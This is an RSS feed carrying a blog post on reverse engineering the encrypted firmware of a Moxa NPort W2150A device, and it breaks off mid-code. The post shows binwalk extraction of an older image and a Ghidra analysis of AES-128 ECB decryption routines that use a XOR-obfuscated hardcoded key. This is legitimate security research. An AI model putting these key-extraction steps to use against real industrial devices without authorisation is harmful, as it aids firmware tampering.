<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Nam&#39;s Journal</title>
        <link>https://namberino.github.io/posts/</link>
        <description>Recent content in Posts on Nam&#39;s Journal</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 22 Apr 2024 14:40:02 +0700</lastBuildDate>
        <atom:link href="https://namberino.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Decrypting a Serial-To-WiFi device&#39;s firmware</title>
            <link>https://namberino.github.io/posts/2024/04/decrypting-a-serial-to-wifi-devices-firmware/</link>
            <pubDate>Mon, 22 Apr 2024 14:40:02 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/decrypting-a-serial-to-wifi-devices-firmware/</guid>
            <description>I&amp;rsquo;ve been doing some research into reverse engineering for a while now. I&amp;rsquo;ve also been learning about firmware and embedded systems for a long time. And I thought &amp;ldquo;Wouldn&amp;rsquo;t it be cool to combine these to skills to do something?&amp;rdquo;. So I decided to try decrypting the encrypted firmware of the a Serial-To-WiFi device. I&amp;rsquo;ve documented my process here in this blog post.
The device I recently read that there was a vulnerability in the Moxa NPort W2150A Serial-To-Wifi device that exploit stack-based buffer overflow.</description>
            <content type="html"><![CDATA[<p>I&rsquo;ve been doing some research into reverse engineering for a while now. I&rsquo;ve also been learning about firmware and embedded systems for a long time. And I thought &ldquo;Wouldn&rsquo;t it be cool to combine these to skills to do something?&rdquo;. So I decided to try decrypting the encrypted firmware of the a Serial-To-WiFi device. I&rsquo;ve documented my process here in this blog post.</p>
<h1 id="the-device">The device</h1>
<p>I recently read that there was a vulnerability in the <a href="https://www.moxa.com/en/products/industrial-edge-connectivity/serial-device-servers/wireless-device-servers/nport-w2150a-w2250a-series"><em>Moxa NPort W2150A Serial-To-Wifi</em></a> device that exploit stack-based buffer overflow. I decided I would take a shot at decrypting the firmware for this device, which was encrypted by default.</p>
<p>I decided to find an older version of the firmware an try to crack it. After looking through the internet, I found <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom"><em>v2.2</em></a>. So I downloaded the firmware and got to decrypting.</p>
<h1 id="the-analysis">The analysis</h1>
<p>I want try to extract any kind of information about this firmware first and see how encrypted the file is.</p>
<p>The first thing I did when I downloaded the firmware was running it through <code>file</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom
</span></span><span style="display:flex;"><span>moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom: data
</span></span></code></pre></div><p>The output says <code>data</code> which means the <code>file</code> command cannot detect any file signatures within this <code>.rom</code> file. So this is an indication that this file has been heavily encrypted.</p>
<p>Next, I use <code>hexdump</code> to check out the general structure of the firmware:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hexdump -C moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom | head
</span></span></code></pre></div>
    <img src="/img/nport-firmware/nport-firmware-hexdump.png"  alt="hexdump of NPort firmware"  class="center"  style="padding: 10px"  />


<p>We can see that at the beginning of the file is <code>NPW2X50A8k</code> which is the name of the devices. After that is some padding or null bytes and after that is some random bytes. So there&rsquo;s not much information we can extract from here.</p>
<p>Since we can&rsquo;t really find anything using <code>file</code> and <code>hexdump</code>, let&rsquo;s use a more powerful tool. I&rsquo;ll use <code>binwalk</code> as that tool allows me to walk through the entire binary and find file signatures and compression methods. The tool also provides extensive binary analysis tools.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom
</span></span></code></pre></div><p>Running this <code>binwalk</code> command, <code>binwalk</code> can only find a <code>MySQL</code> file, which is most likely a false positive because I don&rsquo;t think a Serial-To-WiFi device would need to use a database. So we can&rsquo;t really extract any information from this. So what else can we do now?</p>
<p>I started looking through older versions of this firmware. When I was looking through the <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/W2250A%20Series_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom_Software%20Release%20History.pdf">release note</a> of version <em>1.11</em>, I found this interesting note:</p>

    <img src="/img/nport-firmware/nport-firmware-version11-release-note.png"  alt="NPort firmware version 1.11 release note"  class="center"  style="padding: 10px"  />


<p>Version <em>1.11</em> is a requirement for upgrading to version <em>2.2</em>. This got me wondering if the encryption for the firmware was added with the v2.2 update. So I downloaded the <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-1.11.rom">v1.11</a> release and start checking out the firmware.</p>
<p>Next, I tried <code>binwalk</code> on this firmware:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div>
    <img src="/img/nport-firmware/nport-firmware-older-version-binwalk.png"  alt="NPort firmware version 1.11 binwalk"  class="center"  style="padding: 10px"  />


<p>And we can confirm that this firmware is not encrypted. There are 2 things that looks interesting here: The 2 <code>squashfs</code> filesystems compressed by <code>gzip</code>. <code>squashfs</code> is an entire Linux filesystem compressed.</p>
<p>Now that we know what is in the firmware, let&rsquo;s extract it:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div><p>This command will extract the <em>v1.11</em> firmware into the <code>_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom.extracted</code> directory:</p>

    <img src="/img/nport-firmware/nport-firmware-extracted-screenshot.png"  alt="NPort firmware version 1.11 extracted"  class="center"  style="padding: 10px"  />


<p>There are some <code>squashfs-root</code> directories, which contains the firmware&rsquo;s Linux filesystem. Before we can access this, we need to give the directories correct permissions to be able to access it:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x -R squashfs-root*
</span></span></code></pre></div><p>Now we can access the <code>squashfs-root</code> directories. This looks like a <em>UNIX</em> filesystem:</p>

    <img src="/img/nport-firmware/nport-firmware-old-version-filesystem.png"  alt="NPort firmware version 1.11 extracted filesystem"  class="center"  style="padding: 10px"  />


<p>After searching through the directories, I stumbled across an interesting file in the <code>lib</code> directory of <code>squashfs-root</code>: <code>libupgradeFirmware.so</code>. Because we found out earlier that upgrading to <em>v2.2</em> requires us to have <em>v1.11</em>, I&rsquo;m guessing this <code>libupgradeFirmware.so</code> library will contain some information about how the firmware is encrypted. So let&rsquo;s analyze this binary.</p>
<h1 id="the-libupgradefirmwareso-reverse-engineering">The <strong>libupgradeFirmware.so</strong> reverse engineering</h1>
<p>I&rsquo;ll use <a href="https://ghidra-sre.org/"><code>Ghidra</code></a> as my decompiler of choice. It&rsquo;s open source and it&rsquo;s feature full.</p>
<p>I created a new project, exported the <code>libupgradeFirmware.so</code> file into the Ghidra project and check out the functions available in the binary:</p>

    <img src="/img/nport-firmware/nport-firmware-ghidra-function-window.png"  alt="NPort firmware Ghidra function window"  class="center"  style="padding: 10px"  />


<p>We can see here that this binary uses <strong>AES</strong> block encryption algorithm. Specifically <strong>ECB</strong> mode (Electronic Code Block mode). Because <strong>ECB</strong> mode generates repeating ciphertext from repeating plaintext, it is easy for someone to derive the secret key and decrypt the encryption. So this represents a huge vulnerability, which we can exploit.</p>
<p>We can also see that there&rsquo;s a function called <code>fw_decrypt</code>. This is probably the firmware decrypt function, which means it&rsquo;s quite important in this firmware.</p>
<p>After some digging around in the code, I found that the <code>fw_decrypt</code> function calls another pretty interesting function called <code>ecb128Decrypt</code>. This is probably the AES 128 ECB mode decrypt function. And that function was directly calling some AES functions from the <em>OpenSSL</em> library. So to decrypt this firmware, we can use the <em>OpenSSL</em> command-line command in AES mode. However, we need to obtain the key used to encrypt this firmware to decrypt it.</p>
<h1 id="reversing-the-ecb128decrypt-function">Reversing the ecb128Decrypt function</h1>
<p>I&rsquo;ll try to reverse engineer this to get the key. We&rsquo;ll start by reversing the <code>ecb128Decrypt</code> function:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-function-reversed.png"  alt="NPort firmware ecb128Decrypt function reversed"  class="center"  style="padding: 10px"  />


<p>Let&rsquo;s analyze this. I&rsquo;ll rename and retype the variables as we analyze the program.</p>
<p>First, we&rsquo;ll checkout the AES function. The <code>AES_set_decrypt_key</code> takes in a user key and expand it to an AES key. We can see that the <code>AES_set_decrypt_key</code> function uses <code>auStack_30</code>. In the <a href="https://www.openssl.org/docs/">OpenSSL documentation</a>, we know that the first argument in this function is a user key. So we can rename <code>auStack_30</code> to <code>user_key</code>. <code>AStack_124</code> is the AES key so we&rsquo;ll rename it to <code>aes_key</code>, this will be used for decryption later on.</p>
<p>This function also takes in a key size argument too. In our program, the key size argument is <em>0x80</em> which is <em>128</em> in decimal, so we are working with a <em>128-bit</em> AES key. I&rsquo;ll change the type of this <em>0x80</em> to decimal.</p>
<p>Next, we can see in the <code>strncpy</code> line, it&rsquo;s copying 16 bytes of <code>param_4</code> into <code>auStack_30</code>, which is user key. So <code>param_4</code> is probably the decryption key because <code>user_key</code> will later be used in the AES decrypt function for decryption. We&rsquo;ll rename this to <code>decrypt_key</code>.</p>
<p>We&rsquo;ll take a look at the <code>in</code> and <code>out</code> variables, we can see that they contain the values of <code>param_1</code> and <code>param_2</code> and they are offseted by <em>0x10</em> (or 16). These 2 variables are also passed into the <code>AES_ecb_encrypt</code> function.</p>
<p>The <code>AES_ecb_encrypt</code> function takes in an input buffer, an output buffer, an AES key and a encrypt mode. Since the encrypt mode for the <code>AES_ecb_encrypt</code> function is 0 in this case, <code>AES_ecb_encrypt</code> will be put into decrypt mode. So this will decrypt the data in the input buffer using the AES key and output the decrypted data to the output buffer.</p>
<p>So we can deduct that the <code>param_1</code> and <code>param_2</code> variables are the input buffer and output buffer. We&rsquo;ll rename <code>param_1</code> to <code>decrypt_in</code> and <code>param_2</code> to <code>decrypt_out</code> and retype them as <code>uchar*</code> because <code>in</code> and <code>out</code> are both <code>uchar*</code>.</p>
<p>Next, we can see that <code>iVar1</code> is the index variable used in the loop, and it only stop when it is equal to <code>param_3 + -0x28</code>. So I think <code>param_3</code> is the size of the input buffer. We&rsquo;ll rename <code>param_3</code> to <code>decrypt_size</code>. We can see that <code>decrypt_size</code> needs to be offseted by <code>-0x28</code>, this might be an indication that there&rsquo;s some padding bytes in front of the file. If you remember back when we tried to hexdump the firmware, we found some padding 0 bytes on top of the file. So this firmware was offseted by <em>0x28</em> or 40 bytes.</p>
<p>Here&rsquo;s the renamed and retyped function:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-reversed-renamed.png"  alt="NPort firmware ecb128Decrypt function renamed"  class="center"  style="padding: 10px"  />


<p>Now, we can say how <code>ecb128Decrypt</code> works: It takes in an encrypted input buffer (<code>decrypt_in</code>), decrypt it with a key (<code>decrypt_key</code>), and output it into an output buffer (<code>decrypt_out</code>).</p>
<h1 id="reversing-the-fw_decrypt-function">Reversing the fw_decrypt function</h1>
<p>Now we understand how the <code>ecb128Decrypt</code> function (which is the main function used in the <code>fw_decrypt</code> function) works, we&rsquo;ll check out the <code>fw_decrypt</code> function and see how that works.</p>
<blockquote>
<p><strong>Note</strong>: The code for <code>fw_decrypt</code> is quite long so I&rsquo;ll copy it into a code block here instead of taking a picture</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined8</span> <span style="color:#61afef;font-weight:bold">fw_decrypt</span>(<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_3</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">puVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">decrypt_size</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">__src</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">local_24</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uStack_20</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">==</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)<span style="color:#d19a66">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> ((((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x29</span>) <span style="color:#56b6c2">||</span> (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span>)) <span style="color:#56b6c2">||</span>
</span></span><span style="display:flex;"><span>        (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>))) <span style="color:#56b6c2">||</span> ((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&amp;</span> <span style="color:#d19a66">0xf</span>) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_24</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uStack_20</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_3</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>((<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (((<span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>) <span style="color:#56b6c2">&amp;&amp;</span> ((<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>)) <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">__src</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_24</span>,<span style="color:#e06c75">__src</span>,<span style="color:#d19a66">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)<span style="color:#61afef;font-weight:bold">cal_crc32</span>((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">__src</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>,<span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">+</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>,
</span></span><span style="display:flex;"><span>                                   <span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">local_24</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> ((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">uVar4</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffb</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_0001191c</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#e06c75">LAB_0001191c</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#61afef;font-weight:bold">CONCAT44</span>(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uVar1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s analyze each parts. On this line:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>((<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span></code></pre></div><p>Since we know how <code>ecb128Decrypt</code> works, we can see that the parameters <code>decrypt_in</code> and <code>decrypt_out</code> takes in the same variable: <code>param_1</code>. So it looks like the variable is being decrypted into the same place. We&rsquo;ll rename <code>param_1</code> to <code>fw_buffer</code> and retype it to <code>uchar*</code>.</p>
<p>The <code>ecb128Decrypt</code> also takes in a variable called <code>decrypt_size</code>, which got its value from <code>param_2</code> (see line <code>decrypt_size = *param_2;</code>). So we can rename <code>param_2</code> to <code>fw_buffer_size</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>(<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span></code></pre></div><p>Next, the first conditional &ldquo;<em>if</em>&rdquo; statement checks whether <code>param_1</code> (<code>fw_buffer</code>) is <em>null</em> or not. If it is, it sets the <code>uVar2</code> to <em>0xffffffff</em>. We know that <code>uVar2</code> is the return value of this <code>fw_decrypt</code> function so we&rsquo;ll rename this to <code>return_value</code>.</p>
<p>By trying to set the <code>return_value</code> to <em>0xffffffff</em>, it&rsquo;s trying to overflow the <code>return_value</code> into the negative range. We can check what negative number this will overflow into by changing the data type of <code>return_value</code> from <code>uint</code> to <code>int</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">==</span> (<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#d19a66">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">return_value</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this will just return <em>-1</em>, which means failed in C, if the <code>fw_buffer</code> is <em>null</em>. By figuring out what <code>uVar2</code> is, we can also derive the return type of this <code>fw_decrypt</code> function, which is <code>int</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">fw_decrypt</span>(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer_size</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_3</span>)
</span></span></code></pre></div><p>We&rsquo;re getting close, the function is much easier to read now.</p>
<p>In the <em>if</em> statement inside the <em>else if</em> statement, it&rsquo;s checking for errors and valid firmware size and return a negative value if it&rsquo;s not successful, nothing interesting yet. The <em>else</em> statement after that looks quite interesting though:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
